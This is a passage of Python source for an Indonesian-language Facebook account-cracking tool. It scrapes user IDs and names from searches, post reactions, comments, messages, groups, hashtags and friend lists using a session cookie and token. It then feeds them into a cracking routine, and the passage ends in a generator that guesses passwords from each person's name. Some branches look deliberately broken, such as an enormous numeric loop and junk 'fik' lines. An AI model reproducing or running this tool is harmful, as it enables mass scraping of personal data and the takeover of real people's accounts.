        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
        for set1 in put:
            data.append(set1)
            for set2 in common:data.append(set2+' '+set1)
        for set3 in data:url = 'https://mbasic.facebook.com/search/people/?q='+set3;self.exec(url,cookie)
        self.lanjut()
    def exec(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                spam = pra.find_all('h2')[0]
                if 'Anda Diblokir Sementara' in spam.text:print("\r%s╠══[%s••%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
                else:print("\r%s╠══[%s••%s] %sSedang Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
                for temu in pra.find_all('a',href=True):
                    if "<img alt=" in str(temu):
                        if "home.php" in str(temu["href"]):continue
                        else:
                            try:
                                if 'profile.php' in str(temu["href"]):
                                    find = re.findall('"/profile\.php\?id=(.*?)&"',str(temu))[0]
                                    if len(find) !=0:
                                        id   = ''.join(find)
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if len(gabung_sandi) != 1:
                                            for x in range(Postingan):
                                                open(file_dump,'a+').write('fik\n')
                                        else:
                                            if id in file:continue
                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                                elif 'refid' in str(temu["href"]):
                                    find = re.findall("/(.*?)\?",str(temu))[0]
                                    if len(find) !=0:
                                        id   = convert_id(''.join(find))
                                        kat  = id.split('.')[0] + '.' + id.split('.')[1]
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if len(gabung_sandi) != 1:
                                            for x in range(Postingan):
                                                open(file_dump,'a+').write('fik\n')
                                        else:
                                            if id in file:continue
                                            else:
                                                if kat in file:continue
                                                else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                            except (IndexError,ValueError,IOError):continue
                            except KeyboardInterrupt:exit(self.lanjut())
                for tamu in pra.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in tamu.text:new_url = tamu['href'];self.exec(new_url,cookie)
        except KeyboardInterrupt:exit(self.lanjut())
    def lanjut(self):
        print("\n%s╠══[%s••%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.file_dump,'r').read().splitlines()),P))
        print('%s╠══[%s••%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
        system_login();metode();addpass();crack()
        
###----------[ DUMP ID LIKERS ]---------- ###
def main_likers():
    global _react_type_, file_dump, urutan_crack
    urutan_crack = '0'
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        print('%s╠══[%s••%s] %sContoh : 126981913335699'%(K,P,K,P))
        _query_ = input('%s╠══[%s••%s] %sID Postingan : %s'%(K,P,K,P,K))
        print('')
    except Exception as e:kecuali(e)
    print('%s╠══[%s01%s] %sLike'%(K,P,K,P))
    print('%s╠══[%s02%s] %sWow'%(K,P,K,P))
    print('%s╠══[%s03%s] %sSad'%(K,P,K,P))
    print('%s╠══[%s04%s] %sCare'%(K,P,K,P))
    print('%s╠══[%s05%s] %sLove'%(K,P,K,P))
    print('%s╠══[%s06%s] %sHaha'%(K,P,K,P))
    print('%s╠══[%s07%s] %sAngry'%(K,P,K,P))
    print('%s╠══[%s08%s] %sDll'%(K,P,K,A))
    rt = input('%s╠══[%s••%s] %sPilih : %s'%(A,K,A,K,A))
    if rt in ['1','01','a']:_react_type_='1'
    elif rt in ['2','02','b']:_react_type_='2'
    elif rt in ['3','03','c']:_react_type_='3'
    elif rt in ['4','04','d']:_react_type_='4'
    elif rt in ['5','05','e']:_react_type_='7'
    elif rt in ['6','06','f']:_react_type_='8'
    elif rt in ['7','07','g']:_react_type_='16'
    elif rt in ['8','08','h']:_react_type_='0'
    else:exit()
    _file_ = _query_+'.json'
    file_dump = _file_
    try:os.remove(_query_+'.json')
    except:pass
    open(_file_,'w')
    _url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
    scrape_likers(cookie,_url_,_file_)
    print("\n%s╠══[%s••%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(_file_,'r').read().splitlines()),P))
    print('%s╠══[%s••%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
def scrape_likers(_syafii_,_url_,_file_):
    _ses_ = requests.Session()
    _url_load_ = _ses_.get(_url_,cookies=_syafii_,headers=header_grup).text.encode("utf-8")
    _ses_par_ = par(_url_load_,'html.parser')
    print("\r%s╠══[%s••%s] %sSedang Mengambil %s%s %sID"%(K,P,K,P,K,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            if len(tempel_sandi) != 1:
                for x in range(Postingan):
                    open(file_dump,'a+').write('fik\n')
            else:
                for _id_ in _isi_.find_all('a',href=True):
                    try:
                        if "profile.php" in _id_.get("href"):
                            _a_ = _id_.get("href").split('=')[1]
                            __id__ = _id_.text
                            open(_file_,'a+').write(_a_+'='+__id__+'\n')
                        else:
                            _a_ = _id_.get("href").split('/')[1]
                            __id__ = _id_.text
                            open(_file_,'a+').write(_a_+'='+__id__+'\n')
                    except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:scrape_likers(_syafii_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
                    except Exception as e:pass
    except KeyboardInterrupt:pass

###----------[ DUMP ID COMMENTS ]---------- ###
class komen:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            cookie = {'cookie':open('login/cookie.json','r').read()}
            print('%s╠══[%s••%s] %sContoh : 126981913335699'%(K,P,K,P))
            put = input('%s╠══[%s••%s] %sID Postingan : %s'%(K,P,K,P,K))
            url = 'https://mbasic.facebook.com/'+put
            self.file_dump = ('dump/%s.json'%(put))
            file_dump = self.file_dump
            open(self.file_dump,'w').write('')
        except Exception as e:kecuali(e)
        self.exec(url,cookie)
        print("\n%s╠══[%s••%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.file_dump,'r').read().splitlines()),P))
        print('%s╠══[%s••%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
    def exec(self,url,cookie):
        print("\r%s╠══[%s••%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for x,y,z in re.findall('<h3><a class=\".*?\" href="(.*?)">(.*?)</a></h3><div class=\".*?\">(.*?)</div><div class=\".*?\">',str(pra)):
                    self.f = open(self.file_dump,'r').read()
                    if 'profile.php' in str(x):u  = str(x).split('=')[1].split('&')[0]
                    else:ud = str(x).split('?')[0].replace('/','');u  = convert_id(ud)
                    try:
                        if len(tempel_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                        else:
                            if str(u) in str(self.f):continue
                            else:open(self.file_dump,'a+').write('%s=%s\n'%(u,str(y)))
                    except:continue
                for i in pra.find_all('a'):
                    if 'Lihat komentar sebelumnya' in i.text:
                        new_url = 'https://mbasic.facebook.com' + i['href']
                        self.exec(new_url,cookie)
        except KeyboardInterrupt:pass

###----------[ DUMP ID MESSAGE ]---------- ###
class message:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            url    = 'https://mbasic.facebook.com/messages'
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            self.myaccount = json.loads(requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie).text)["id"]
            self.file_dump = ('dump/message.json')
            file_dump = self.file_dump
            open(self.file_dump,'w').write('')
        except Exception as e:kecuali(e)
        self.exec(url,cookie)
        print("\n%s╠══[%s••%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.file_dump,'r').read().splitlines()),P))
        print('%s╠══[%s••%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
    def exec(self,url,cookie):
        print("\r%s╠══[%s••%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for tata in pra.find_all('a',href=True):
                    if '/messages/read/?tid=cid.c' in tata['href']:
                        if 'Pengguna Facebook' in str(tata):continue
                        else:
                            idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(tata))
                            if len(gabung_sandi) != 1:
                                for x in range(Postingan):
                                    open(file_dump,'a+').write('fik\n')
                            else:
                                for id in list(idzx.pop()):
                                    try:
                                        if id == self.myaccount:continue
                                        else:
                                            nama = tata.text
                                            if nama == '':continue
                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                                    except:continue
                    else:continue
                for tete in pra.find_all('a',href=True):
                    if 'Lihat Pesan Sebelumnya' in tete.text:
                        new_url = 'https://mbasic.facebook.com' + tete['href']
                        self.exec(new_url,cookie)
        except KeyboardInterrupt:pass

###
class grup:
    def __init__(self):
        global urutan_crack
        urutan_crack = '0'
        self.datagrup = {}
        self.looping  = 0
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        self.main_grup(cookie)
    def main_grup(self,cookie):
        print('%s║'%(B))
        print('%s╠══[%s01%s] %sBergabung'%(K,P,K,P))
        print('%s╠══[%s02%s] %sNama'%(K,P,K,P))
        print('%s╠══[%s03%s] %sID'%(K,P,K,P))
        ty = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
        if ty in ['1','01','a']:
            print('%s║'%(B))
            self.file = ('dump/mygroup.json')
            open(self.file,'w').write('')
            url= 'https://mbasic.facebook.com/groups/?seemore&refid=1000'
            self.cari_gabung(url,cookie)
        elif ty in ['2','02','b']:
            put = input('%s╠══[%s•%s] %sMasukkan Nama Grub : '%(K,P,K,P))
            print('%s║'%(B))
            self.file = ('dump/%s.json'%(put.replace(' ','_')))
            open(self.file,'w').write('')
            url = 'https://mbasic.facebook.com/search/groups/?q=' + put
            self.cari_nama(url,cookie)
        elif ty in ['3','03','c']:
            self._id_ = input('%s╠══[%s•%s] %sMasukkan ID Grub : '%(K,P,K,P))
            self._pil_ = True
            print('')
            self.second_grup(cookie)
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));exit()
    def cari_gabung(self,url,cookie):
        with requests.Session() as xyz:
            req = xyz.get(url,cookies=cookie)
            pra = par(req.content,'html.parser')
            for c in pra.find_all('a'):
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        dt = self.data_grup(id,cookie)
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("\r%s╠══[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                        else:
                            self.looping += 1
                            tar = str(self.looping)
                            print(f"{A}╠══[•] ID Grup : {id}{dt}")
                            self.datagrup.update({str(self.looping):id})
                    else:continue
                except KeyboardInterrupt:pass
    def cari_nama(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        if id not in open(self.file,'r').read():
                            open(self.file,'a+').write(id+'\n')
                            id = open(self.file,'r').read().splitlines()[-1]
                            dt = self.data_grup(id,cookie)
                            if 'Grup Privat' in str(dt):continue
                            elif 'Anda Diblokir Sementara' in str(dt):self.looping += 1;print("\r%s╠══[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                                tar = str(self.looping)
                                print(f"{A}╠══[•] ID Grup : {id}{dt}")
                                self.datagrup.update({str(self.looping):id})
                        else:continue
                    else:continue
                for c in pra.find_all('a'):
                    if 'Lihat Hasil Selanjutnya' in c.text:
                        new_url = c['href']
                        self.cari_nama(new_url,cookie)
        except KeyboardInterrupt:pass
    def data_grup(self,id,cookie):
        try:
            with requests.Session() as xyz:
                url = 'https://mbasic.facebook.com/groups/'+id
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                try:nama = re.findall('<head><title>(.*?)</title>',str(pra))[0]
                except:nama = ''
                try:tipe = re.findall('</div></h1><div class=\".*?\">(.*?)</div></td></tr></tbody></table></a></td>',str(pra))[0]
                except:tipe = ''
                try:member = re.findall('Anggota</a></td><td class=\".*?\"><span class=\".*?\" id=\".*?\">(.*?)</span></td></tr></tbody></table></li>',str(pra))[0]
                except:member = ''
                zyx = ('\n • Nama : %s\n • Tipe : %s\n • Anggota : %s'%(nama,tipe,member))
                return(zyx)
        except KeyboardInterrupt:
            self._pil_ = False
            exit(self.second_grup(cookie))
    def second_grup(self,cookie):
        global file_dump
        if self._pil_ == True:pro = self._id_
        else:
            coy =  input('%s╠══[%s••%s] %sPilih : '%(K,P,K,P))
            print('%s║'%(B))
            try:pro = self.datagrup[coy]
            except Exception as e:kecuali(e)
        self.files = ('dump/%s.json'%(pro.replace(' ','_')))
        file_dump = self.files
        open(self.files,'w').write('')
        print('%s╠══[%s01%s] %sID Member'%(K,P,K,P))
        print('%s╠══[%s02%s] %sID Post'%(K,P,K,P))
        cuy = input('%s╠══[%s••%s] %sPilih : '%(K,P,K,P))
        if cuy in ['1','01','a']:
            url_member = 'https://mbasic.facebook.com/browse/group/members/?id=' + pro
            self.dump_member(url_member,cookie)
            print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P))
            print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
            system_login();metode();addpass();crack()
        elif cuy in ['2','02','b']:
            url_grup = 'https://mbasic.facebook.com/groups/' + pro
            self.dump_post(url_grup,cookie)
            print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P))
            print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
            system_login();metode();addpass();crack()
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    def dump_member(self,url,cookie):
        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'profile.php' in po['href']:
                                    id = str(po['href']).split('=')[1]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    id = str(po['href']).replace('/','')
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Selengkapnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_member(new_url,cookie)
            except KeyboardInterrupt:pass
    def dump_post(self,url,cookie):
        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'mbasic.facebook.com' in po['href']:pass
                                elif 'story.php' in po['href']:pass
                                elif 'Halaman' in po.text:pass
                                elif 'profile.php' in po['href']:
                                    id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    ud = re.findall('\/(.*?)\/\?refid',str(po['href']))[0]
                                    id = convert_id(ud)
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Postingan Lainnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_post(new_url,cookie)
            except KeyboardInterrupt:pass

###----------[ DUMP ID HASHTAG ]---------- ###
class hashtag:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        xd = input('%s╠══[%s••%s] %sCari Hashtag : %s'%(K,P,K,P,K)).replace(' ','')
        url = 'https://mbasic.facebook.com/hashtag/' + xd
        self.files = ('dump/%s.json'%(xd))
        file_dump = self.files
        open(self.files,'w').write('')
        self.dump(url,cookie)
        print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
        print('%s╠══[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def dump(self,url,cookie):
        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = par(xyz.get(url,cookies=cookie).content,'html.parser')
                for x in req.find_all('h3'):
                    for y in x.find_all('a',href=True):
                        if len(tempel_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                        else:
                            try:
                                op = open(self.files,'r').read()
                                if 'mbasic.facebook.com' in y['href']:pass
                                elif 'sub_view' in y['href']:pass
                                elif '/?' in y['href']:pass
                                elif 'profile.php' in y['href']:
                                    id = str(re.search('\?id=(.*?)&',y['href']).group(1))
                                    nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
                                    if id in op:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    ud = str(re.search('\/(.*?)\?',y['href']).group(1))
                                    id = convert_id(ud)
                                    nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
                                    if id in op:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:
                                continue
                for z in req.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in z.text:self.dump(z['href'],cookie)
            except KeyboardInterrupt:pass

###----------[ DUMP ID SUGGESTIONS ]---------- ###
class suggestion:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:print(e);exit()
        print('%s║'%(B))
        print('%s╠══[%s01%s] %sSaran'%(K,P,K,P))
        print('%s╠══[%s02%s] %sMasuk'%(K,P,K,P))
        print('%s╠══[%s03%s] %sKeluar'%(K,P,K,P))
        pl = input('%s╠══[%s••%s] %sPilih : '%(K,P,K,P))
        if pl in ['1','01','a']:
            url = 'https://mbasic.facebook.com/friends/center/suggestions'
            self.files = 'dump/suggestions.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P))
            print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
        elif pl in ['2','02','b']:
            url = 'https://mbasic.facebook.com/friends/center/requests'
            self.files = 'dump/requests.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P))
            print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
        elif pl in ['3','03','c']:
            url = 'https://mbasic.facebook.com/friends/center/requests/outgoing'
            self.files = 'dump/outgoing.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P))
            print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    def exec(self,url,cookie):
        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID"%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = par(xyz.get(url,cookies=cookie).content,'html.parser')
                for x in req.find_all('a',href=True):
                    file = open(self.files,'r').read()
                    if 'hovercard' in x['href']:
                        try:
                            id = re.search('uid=(.*?)&',x['href']).group(1)
                            nm = x.text
                            if len(tempel_sandi) != 1:
                                for x in range(Postingan):
                                    open(file_dump,'a+').write('fik\n')
                            else:
                                if id in file:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:continue
                for y in req.find_all('a',href=True):
                    if 'Lihat selengkapnya' in y.text:
                        next_url = 'https://mbasic.facebook.com' + y['href']
                        self.exec(next_url,cookie)
            except KeyboardInterrupt as e:pass

###----------[ DUMP ID FRIENDLIST FROM FRIENDLIST ]---------- ###
class teman_teman:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            cook    = open('login/cookie.json','r').read()
            cookie  = {'cookie':cook}
            token   = open('login/token.json','r').read()
            self.my = re.search('c_user=(.*?);',str(cook)).group(1)
        except Exception as e:print(e);exit()
        self.target = input('%s╠══[%s••%s] %sMasukkan ID : %s'%(J,P,J,P,J))
        pl = input('%s╠══[%s••%s] %sPilih ID Muda/Tua [m/t] : %s'%(J,P,J,P,J))
        if pl in ['1','01','m','M','a']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/muda_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.muda_dev(url,cookie,token,True)
        elif pl in ['2','02','t','T','b']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/tua_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.tua_dev(url,cookie,token,True)
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    def muda_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2, id3 = [], [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:id2.insert(0,y)
                    for z in id2:
                        id3.append(z)
                        if len(id3) == 100:break
                    for p in id3:
                        q = p.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.muda_dev(url,cookie,token,False)
                else:
                    id4, id5, id6 = [], [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id4.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id4:id5.insert(0,b)
                    for c in id5:
                        id6.append(c)
                        if len(id6) == 100:break
                    for o in id6:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                                print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID           "%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID           "%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print('\r%s╠══[%s•%s] %sTeman %s%s %sTidak Publik'%(K,P,K,P,K,self.target,P), end='');sys.stdout.flush()
    def tua_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2 = [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:
                        id2.append(y)
                        if len(id2) == 100:break
                    for a in id2:
                        q = a.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.tua_dev(url,cookie,token,False)
                else:
                    id3, id4 = [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id3.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id3:
                        id4.append(b)
                        if len(id4) == 100:break
                    for o in id4:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fik\n')
                                print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID           "%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        else:
                            if u in l:continue
                            elif u == self.my:continue
                            else:open(self.files,'a+').write(o)
                        print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID           "%(K,P,K,P,K,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
            except KeyboardInterrupt:
                exit(self.lanjut())
            except Exception as e:
                print('\r%s╠══[%s•%s] %sTeman %s%s %sTidak Publik'%(K,P,K,P,K,self.target,P), end='');sys.stdout.flush()
    def lanjut(self):
        print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
        print('%s╠══[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        system_login();metode();addpass();crack()
        
###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('%s║'%(K))
    print('%s╠══[%s1%s] %sValidate'%(K,P,K,P))
    print('%s╠══[%s2%s] %sReguler'%(K,P,K,P))
    print('%s╠══[%s3%s] %sLog IG'%(K,P,K,P))
    ch = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    if ch in ['0','00','z']:sistem_login = "nol"
    elif ch in ['1','01','a']:sistem_login = "satu"
    elif ch in ['2','02','b']:sistem_login = "dua"
    elif ch in ['3','03','c']:sistem_login = "tiga"
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()

###----------[ URL LOGIN ]---------- ###
def metode():
    print('%s║'%(K))
    print('%s╠══[%s1%s] %sFree'%(K,P,K,P))
    print('%s╠══[%s2%s] %sMbasic'%(K,P,K,P))
    print('%s╠══[%s3%s] %sMobile'%(K,P,K,P))
    ch = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("mobile.facebook.com")
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    
###----------[ URUTAN CRACK ]---------- ###
def urut_crack():
    global urutan_crack
    print('%s║'%(K))
    print('%s╠══[%s1%s] %sID Tua'%(K,P,K,P))
    print('%s╠══[%s2%s] %sID Muda'%(K,P,K,P))
    print('%s╠══[%s3%s] %sID Acak'%(K,P,K,P))
    ch = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    if ch in ['1','01','a']:urutan_crack = '0'
    elif ch in ['2','02','b']:urutan_crack = '1'
    elif ch in ['3','03','c']:urutan_crack = '2'
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));exit()
 
###----------[ GENERATE PASSWORD ]---------- ###
def password(user):
    global pass_manual1, pass_manual2
    syafii = []
    if SAKERA != 159403:
        for x in range(0,10000000000000):syafii.append(str(x))
        return syafii
    else:
        try:
            ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:syafii.append(nd+"123");syafii.append(nd+"12345")
                else:syafii.append(nd);syafii.append(nd+"123");syafii.append(nd+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):syafii.append(nd+x)
            else:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:syafii.append(nd+"123");syafii.append(nd+"12345")
                else:syafii.append(nd);syafii.append(nd+"123");syafii.append(nd+"12345")
                nb = na[-1].lower()
